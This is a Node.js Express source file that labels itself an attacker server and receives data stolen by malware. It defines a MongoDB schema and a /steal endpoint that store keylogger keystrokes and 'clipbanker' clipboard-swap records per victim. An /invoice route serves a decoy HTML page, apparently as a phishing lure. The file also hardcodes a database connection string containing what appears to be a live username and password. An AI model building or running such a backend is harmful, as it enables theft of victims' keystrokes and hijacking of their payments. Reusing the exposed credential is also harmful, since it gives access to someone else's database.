const express = require("express");
const mongoose = require("mongoose");
const path = require("path"); // Import path module

const app = express();
app.use(express.json());

// Serve static files from the current directory (where decoy.html is)
app.use(express.static(path.join(__dirname)));

// Connect to MongoDB
mongoose.connect("mongodb+srv://alaekekaebuka200:Ebscojebscojjj20$@cohort5wilmer.r1c8m.mongodb.net/phishingserver?retryWrites=true&w=majority");

// === Schema ===
const StolenSchema = new mongoose.Schema({
  victim: { type: String, required: true },
  type: { type: String, required: true, enum: ["keylogger", "clipbanker"] },
  data: { type: Object, required: true },
  timestamp: { type: Date, default: Date.now }
});

const Stolen = mongoose.model("Stolen", StolenSchema);

// === Endpoint to receive stolen info ===
app.post("/steal", async (req, res) => {
  try {
    const { victim, type, data, timestamp } = req.body;

    if (!victim || !type || !data) {
      return res.status(400).json({ error: "Missing required fields: victim, type, data." });
    }
    if (!["keylogger", "clipbanker"].includes(type)) {
      return res.status(400).json({ error: "Invalid type. Must be 'keylogger' or 'clipbanker'." });
    }

    // Validate data based on type
    if (type === "keylogger") {
      if (!data.key) {
        return res.status(400).json({ error: "Missing 'key' in data for keylogger event." });
      }
    } else if (type === "clipbanker") {
      if (!data.original || !data.replaced) {
        return res.status(400).json({ error: "Missing 'original' or 'replaced' in data for clipbanker event." });
      }
    }

    const entry = new Stolen({
      victim,
      type,
      data,
      timestamp: timestamp ? new Date(timestamp) : Date.now()
    });
    await entry.save();
    console.log("📥 Saved:", entry);
    res.status(201).json({ success: true });
  } catch (err) {
    console.error("Failed to save stolen data:", err);
    res.status(500).json({ error: "Failed to save data" });
  }
});

// New route to serve the decoy HTML
app.get("/invoice", (req, res) => {
    res.sendFile(path.join(__dirname, 'decoy.html'));
});


app.listen(5000, () =>
  console.log("🚨 Attacker server running on port 5000")
);
